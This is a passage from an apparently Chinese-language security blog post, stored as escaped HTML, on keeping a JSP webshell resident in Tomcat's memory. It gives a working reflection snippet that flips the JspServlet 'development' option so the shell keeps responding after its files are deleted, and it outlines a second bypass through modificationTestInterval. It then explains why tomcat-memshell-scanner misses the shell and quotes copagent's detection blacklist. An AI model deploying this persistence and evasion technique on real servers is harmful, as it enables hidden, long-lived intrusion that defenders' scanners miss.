(this)\u003C\u002Fcode\u003E加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要\u003Ccode\u003Ethis\u003C\u002Fcode\u003E是一个值，那么\u003Ccode\u003EtheServlet\u003C\u002Fcode\u003E属性的值是一样的，而\u003Ccode\u003Ethis\u003C\u002Fcode\u003E就是当前的\u003Ccode\u003EjspServletWrapper\u003C\u002Fcode\u003E，我们访问不同的JSP也是由不同的\u003Ccode\u003EjspServletWrapper\u003C\u002Fcode\u003E处理的。\u003C\u002Fp\u003E\n\u003Cp\u003E最后就是调用\u003Ccode\u003Eservlet.service\u003C\u002Fcode\u003E方法完成请求处理。\u003C\u002Fp\u003E\n\u003Ch2 data-id=\"heading-4\"\u003E内存驻留分析\u003C\u002Fh2\u003E\n\u003Cp\u003E上面我们已经分析完了JSP的处理逻辑，要想要完成内存驻留，我们要解决下面的问题。\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E请求后不去检查JSP文件是否存在\u003C\u002Fli\u003E\n\u003Cli\u003EtheServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E第二个问题比较容易，\u003Ccode\u003EtheServlet\u003C\u002Fcode\u003E能否获取到Servlet或者获取到哪个Servlet和\u003Ccode\u003EjspServletWrapper\u003C\u002Fcode\u003E是有关的，而在\u003Ccode\u003EJspServlet#serviceJspFile\u003C\u002Fcode\u003E中，如果我们已经将Servlet注册过，可以根据url从\u003Ccode\u003EJspRuntimeContext\u003C\u002Fcode\u003E中获取得到对应的\u003Ccode\u003EjspServletWrapper\u003C\u002Fcode\u003E。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-java copyable\" lang=\"java\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Eprivate\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Evoid\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title function_\"\u003EserviceJspFile\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-params\"\u003E(HttpServletRequest request,\n                                HttpServletResponse response, String jspUri,\n                                \u003Cspan class=\"hljs-type\"\u003Eboolean\u003C\u002Fspan\u003E precompile)\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-keyword\"\u003Ethrows\u003C\u002Fspan\u003E ServletException, IOException {\n        \u003Cspan class=\"hljs-type\"\u003EJspServletWrapper\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-variable\"\u003Ewrapper\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-operator\"\u003E=\u003C\u002Fspan\u003E rctxt.getWrapper(jspUri);\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (wrapper == \u003Cspan class=\"hljs-literal\"\u003Enull\u003C\u002Fspan\u003E) {\n       ...\n        }\n        \u003Cspan class=\"hljs-keyword\"\u003Etry\u003C\u002Fspan\u003E {\n            wrapper.service(request, response, precompile);\n        } \u003Cspan class=\"hljs-keyword\"\u003Ecatch\u003C\u002Fspan\u003E (FileNotFoundException fnfe) {\n            handleMissingResource(request, response, jspUri);\n        }\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 data-id=\"heading-5\"\u003E绕过方法一\u003C\u002Fh3\u003E\n\u003Cp\u003E下面解决\u003Ccode\u003E请求后不去检查JSP文件是否存在\u003C\u002Fcode\u003E问题，首先我想绕过下面的判断,如果我们能让\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ccode\u003Eoptions.getDevelopment()\u003C\u002Fcode\u003E返回false就不会进入\u003Ccode\u003Ecomplie\u003C\u002Fcode\u003E部分。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Eif (options.getDevelopment() || mustCompile) {\n                synchronized (this) {\n                    if (options.getDevelopment() || mustCompile) {\n                        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F The following sets reload to true, if necessary\u003C\u002Fspan\u003E\n                        ctxt\u003Cspan class=\"hljs-selector-class\"\u003E.compile\u003C\u002Fspan\u003E();\n                        mustCompile = false;\n                    }\n                }\n            }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003Edevelopment\u003C\u002Fcode\u003E并不是一个\u003Ccode\u003Estatic\u003C\u002Fcode\u003E属性，所以不能直接修改，要拿到\u003Ccode\u003Eoptions\u003C\u002Fcode\u003E的对象。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Eprivate boolean \u003Cspan class=\"hljs-attr\"\u003Edevelopment\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-literal\"\u003Etrue\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003Eoptions\u003C\u002Fcode\u003E对象被存储在\u003Ccode\u003EJspServlet\u003C\u002Fcode\u003E中，\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scala copyable\" lang=\"scala\"\u003Epublic \u003Cspan class=\"hljs-class\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Eclass\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003EJspServlet\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Eextends\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003EHttpServlet\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003Eimplements\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003EPeriodicEventListener\u003C\u002Fspan\u003E \u003C\u002Fspan\u003E{\n...\n    \u003Cspan class=\"hljs-keyword\"\u003Eprivate\u003C\u002Fspan\u003E transient \u003Cspan class=\"hljs-type\"\u003EOptions\u003C\u002Fspan\u003E options;\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003EMappingData\u003C\u002Fcode\u003E中保存了路由匹配的结果,\u003Ccode\u003EMappingData\u003C\u002Fcode\u003E的\u003Ccode\u003Ewrapper\u003C\u002Fcode\u003E字段包含处理请求的\u003Ccode\u003Ewrapper\u003C\u002Fcode\u003E，在Tomcat中，\u003Ccode\u003EWrapper\u003C\u002Fcode\u003E代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在\u003Ccode\u003EWrapper\u003C\u002Fcode\u003E的\u003Ccode\u003Einstance\u003C\u002Fcode\u003E属性中保存着\u003Ccode\u003Eservlet\u003C\u002Fcode\u003E的实例，因此我们可以从\u003Ccode\u003EMappingData\u003C\u002Fcode\u003E中拿到\u003Ccode\u003EJspServlet\u003C\u002Fcode\u003E进而更改\u003Ccode\u003Eoptions\u003C\u002Fcode\u003E的\u003Ccode\u003Edevelopment\u003C\u002Fcode\u003E属性值。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Epublic class MappingData {\n    public Host \u003Cspan class=\"hljs-attr\"\u003Ehost\u003C\u002Fspan\u003E = null\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    public Context \u003Cspan class=\"hljs-attr\"\u003Econtext\u003C\u002Fspan\u003E = null\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    public int \u003Cspan class=\"hljs-attr\"\u003EcontextSlashCount\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    public Context\u003Cspan class=\"hljs-section\"\u003E[]\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-attr\"\u003Econtexts\u003C\u002Fspan\u003E = null\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    public Wrapper \u003Cspan class=\"hljs-attr\"\u003Ewrapper\u003C\u002Fspan\u003E = null\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    public boolean \u003Cspan class=\"hljs-attr\"\u003EjspWildCard\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n}\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b52c1a2d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b52c1a2d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E所以我们可以通过反射对\u003Ccode\u003Edevelopment\u003C\u002Fcode\u003E的属性修改，下面代码参考\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fwww.anquanke.com%252Fpost%252Fid%252F224698\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F224698\" ref=\"nofollow noopener noreferrer\"\u003ETomcat容器攻防笔记之JSP金蝉脱壳\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003E&#x3C;%\n    \u002F\u002F从request对象中获取request属性\n    Field \u003Cspan class=\"hljs-attr\"\u003ErequestF\u003C\u002Fspan\u003E = request.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"request\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    requestF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Request \u003Cspan class=\"hljs-attr\"\u003Ereq\u003C\u002Fspan\u003E = (Request) requestF.get(request)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取MappingData\n    MappingData \u003Cspan class=\"hljs-attr\"\u003EmappingData\u003C\u002Fspan\u003E = req.getMappingData()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取Wrapper\n    Field \u003Cspan class=\"hljs-attr\"\u003EwrapperF\u003C\u002Fspan\u003E = mappingData.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"wrapper\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    wrapperF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Wrapper \u003Cspan class=\"hljs-attr\"\u003Ewrapper\u003C\u002Fspan\u003E = (Wrapper) wrapperF.get(mappingData)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取jspServlet对象\n    Field \u003Cspan class=\"hljs-attr\"\u003EinstanceF\u003C\u002Fspan\u003E = wrapper.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"instance\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    instanceF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Servlet \u003Cspan class=\"hljs-attr\"\u003EjspServlet\u003C\u002Fspan\u003E = (Servlet) instanceF.get(wrapper)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取options中保存的对象 \n    Field \u003Cspan class=\"hljs-attr\"\u003EOption\u003C\u002Fspan\u003E = jspServlet.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"options\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Option.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    EmbeddedServletOptions \u003Cspan class=\"hljs-attr\"\u003Eop\u003C\u002Fspan\u003E = (EmbeddedServletOptions) Option.get(jspServlet)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F设置development属性为false\n    Field \u003Cspan class=\"hljs-attr\"\u003EDevelopent\u003C\u002Fspan\u003E = op.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"development\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Developent.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Developent.set(op,false)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n%\u003E\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E既然已经分析好了，我们做一个测试， \u003Cstrong\u003E当我们第二次请求我们的脚本\u003C\u002Fstrong\u003E\u003Ccode\u003Edevelopment\u003C\u002Fcode\u003E\u003Cbr\u003E\n\u003Cstrong\u003E的属性值已经被改为false,即使我们删除对应的\u003C\u002Fstrong\u003E\u003Ccode\u003Ejsp\\java\\Class\u003C\u002Fcode\u003E\u003Cstrong\u003E文件，仍然还可以还可以正常请求shell。\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b70cc42d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b70cc42d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003E那么经过修改后会不会导致后来上传的jsp文件都无法执行的问题呢？\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E不会，因为每一个JSP文件，只有已经编译并且注册为Servlet后，\u003Ccode\u003EmustCompile\u003C\u002Fcode\u003E属性才会为False，默认为True，并且\u003Ccode\u003EmustCompile\u003C\u002Fcode\u003E也是由\u003Ccode\u003Evolatile\u003C\u002Fcode\u003E修饰并且在\u003Ccode\u003Esynchronized\u003C\u002Fcode\u003E加锁的代码块中，只有同一个\u003Ccode\u003EjspServletWrapper\u003C\u002Fcode\u003E的\u003Ccode\u003EmustCompile\u003C\u002Fcode\u003E的修改在下次请求时还有效。当然也不是说完全没有影响，\u003Cbr\u003E\n\u003Cstrong\u003E如果我们想修改一个已经加载为\u003C\u002Fstrong\u003E\u003Ccode\u003EServlet\u003C\u002Fcode\u003E \u003Cstrong\u003E的JSP文件，即使修改了也不会生效。\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Eif (options.getDevelopment() || mustCompile) {\n                synchronized (this) {\n                    if (options.getDevelopment() || mustCompile) {\n                        ctxt.compile()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                        \u003Cspan class=\"hljs-attr\"\u003EmustCompile\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    }\n                }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 data-id=\"heading-6\"\u003E绕过方法二\u003C\u002Fh3\u003E\n\u003Cp\u003E下一个我们有机会绕过的点在compile中，如果我们能让\u003Ccode\u003EisOutDated\u003C\u002Fcode\u003E返回false，也可以达到绕过的目的。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Epublic void \u003Cspan class=\"hljs-built_in\"\u003Ecompile\u003C\u002Fspan\u003E() throws JasperException, FileNotFoundException {\n        \u003Cspan class=\"hljs-built_in\"\u003EcreateCompiler\u003C\u002Fspan\u003E();\n        if (jspCompiler.isOutDated()) {\n         ...\n        }\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E注意看下面的代码,在\u003Ccode\u003EisOutDated\u003C\u002Fcode\u003E中，当满足下面的条件则会返回false。\u003Ccode\u003Ejsw\u003C\u002Fcode\u003E中保存的是\u003Ccode\u003EjspServletWarpper\u003C\u002Fcode\u003E对象，所以是不为null的，并且\u003Ccode\u003EmodificationTestInterval\u003C\u002Fcode\u003E默认值是4也满足条件，所以我们现在要做的就是让\u003Ccode\u003EmodificationTestInterval*1000\u003C\u002Fcode\u003E大于\u003Ccode\u003ESystem.currentTimeMillis()\u003C\u002Fcode\u003E,所以\u003Cbr\u003E\n\u003Cstrong\u003E只要将\u003C\u002Fstrong\u003E\u003Ccode\u003E**modificationTestInterval**\u003C\u002Fcode\u003E \u003Cstrong\u003E修改为一个比较大的值也可以达到绕过的目的。\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Epublic boolean \u003Cspan class=\"hljs-built_in\"\u003EisOutDated\u003C\u002Fspan\u003E(boolean checkClass) {\n        if (jsw != null\n                &#x26;&#x26; (ctxt.getOptions()\u003Cspan class=\"hljs-selector-class\"\u003E.getModificationTestInterval\u003C\u002Fspan\u003E() \u003E \u003Cspan class=\"hljs-number\"\u003E0\u003C\u002Fspan\u003E)) {\n            if (jsw.getLastModificationTest()\n                    + (ctxt.getOptions()\u003Cspan class=\"hljs-selector-class\"\u003E.getModificationTestInterval\u003C\u002Fspan\u003E() * \u003Cspan class=\"hljs-number\"\u003E1000\u003C\u002Fspan\u003E) \u003E System\u003Cspan class=\"hljs-selector-class\"\u003E.currentTimeMillis\u003C\u002Fspan\u003E()) {\n                return false;\n            }\n        }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003EmodificationTestInterval\u003C\u002Fcode\u003E也保存在\u003Ccode\u003Eoptions\u003C\u002Fcode\u003E属性中，所以修改的方法和方法一类似，就不罗列代码了。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-java copyable\" lang=\"java\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Epublic\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Efinal\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Eclass\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title class_\"\u003EEmbeddedServletOptions\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Eimplements\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title class_\"\u003EOptions\u003C\u002Fspan\u003E {\n...\n   \u003Cspan class=\"hljs-keyword\"\u003Eprivate\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-type\"\u003Eint\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-variable\"\u003EmodificationTestInterval\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-operator\"\u003E=\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-number\"\u003E4\u003C\u002Fspan\u003E;\n    ...\n}\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 data-id=\"heading-7\"\u003E查杀情况分析\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Cstrong\u003Etomcat-memshell-scanner\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E这款工具会Dump出所有保存在\u003Ccode\u003EservletMappings\u003C\u002Fcode\u003E中的\u003Ccode\u003EServlet\u003C\u002Fcode\u003E的信息，不过我们的JSPServlet并没有保存在\u003Ccode\u003EservletMappings\u003C\u002Fcode\u003E中，而是在\u003Ccode\u003EJspRuntimeContext#jsps\u003C\u002Fcode\u003E字段中，因此根本查不到。\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38a5e9442d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a5e9442d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b692582d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b692582d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Ch3 data-id=\"heading-8\"\u003Ecopagent\u003C\u002Fh3\u003E\n\u003Cp\u003EJSP本质上也就是\u003Ccode\u003EServlet\u003C\u002Fcode\u003E，编译好的Class继承了\u003Ccode\u003EHttpJspBase\u003C\u002Fcode\u003E，类图如下所示。\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b571522d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b571522d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Ch4 data-id=\"heading-9\"\u003Ecopagent流程分析\u003C\u002Fh4\u003E\n\u003Cp\u003E\u003Ccode\u003Ecopagent\u003C\u002Fcode\u003E首先获取所有已经加载的类，并创建了几个数组。\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003EriskSuperClassesName\u003C\u002Fcode\u003E中保存了\u003Ccode\u003EHttpServlet\u003C\u002Fcode\u003E，用于获取Servlet，因为我们注册的Servlet会直接或者间接继承\u003Ccode\u003EHttpServlet\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003EriskPackage\u003C\u002Fcode\u003E保存了一些恶意的包名，比如冰蝎的包名为\u003Ccode\u003Enet.rebeyond\u003C\u002Fcode\u003E，使用冰蝎连接webshell时会将自己的恶意类加载到内存，而这个恶意类也是以\u003Ccode\u003Enet.rebeyond\u003C\u002Fcode\u003E为包名的\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003EriskAnnotations\u003C\u002Fcode\u003E保存了SpringMVC中注解注册Controller的类型，显然是为了抓出所有SpringMVC中通过注解注册的Controller\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-arduino copyable\" lang=\"arduino\"\u003E\u003Cspan class=\"hljs-function\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Eprivate\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-type\"\u003Estatic\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Esynchronized\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-type\"\u003Evoid\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003EcatchThief\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-params\"\u003E(\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E name, Instrumentation ins)\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E{\n   ...\n        List&#x3C;Class&#x3C;?\u003E\u003E resultClasses = \u003Cspan class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E ArrayList&#x3C;Class&#x3C;?\u003E\u003E();\n        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 获得所有已加载的类及类名\u003C\u002Fspan\u003E\n        Class&#x3C;?\u003E[] loadedClasses = ins.\u003Cspan class=\"hljs-built_in\"\u003EgetAllLoadedClasses\u003C\u002Fspan\u003E();\n        LogUtils.\u003Cspan class=\"hljs-built_in\"\u003Elogit\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"Found All Loaded Classes    : \"\u003C\u002Fspan\u003E + loadedClasses.length);\n        List&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E loadedClassesNames = \u003Cspan class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-built_in\"\u003EArrayList\u003C\u002Fspan\u003E&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E();\n        \u003Cspan class=\"hljs-keyword\"\u003Efor\u003C\u002Fspan\u003E(Class&#x3C;?\u003E cls: loadedClasses){\n            loadedClassesNames.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(cls.\u003Cspan class=\"hljs-built_in\"\u003EgetName\u003C\u002Fspan\u003E());\n        }\n   ...\n        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 实现的可能具有 web shell 功能的父类名\u003C\u002Fspan\u003E\n        List&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E riskSuperClassesName = \u003Cspan class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-built_in\"\u003EArrayList\u003C\u002Fspan\u003E&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E();\n        riskSuperClassesName.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"javax.servlet.http.HttpServlet\"\u003C\u002Fspan\u003E);\n        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 黑名单拦截\u003C\u002Fspan\u003E\n        List&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E riskPackage = \u003Cspan class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-built_in\"\u003EArrayList\u003C\u002Fspan\u003E&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E();\n        riskPackage.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"net.rebeyond.\"\u003C\u002Fspan\u003E);\n        riskPackage.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"com.metasploit.\"\u003C\u002Fspan\u003E);\n        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 风险注解\u003C\u002Fspan\u003E\n        List&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E riskAnnotations = \u003Cspan 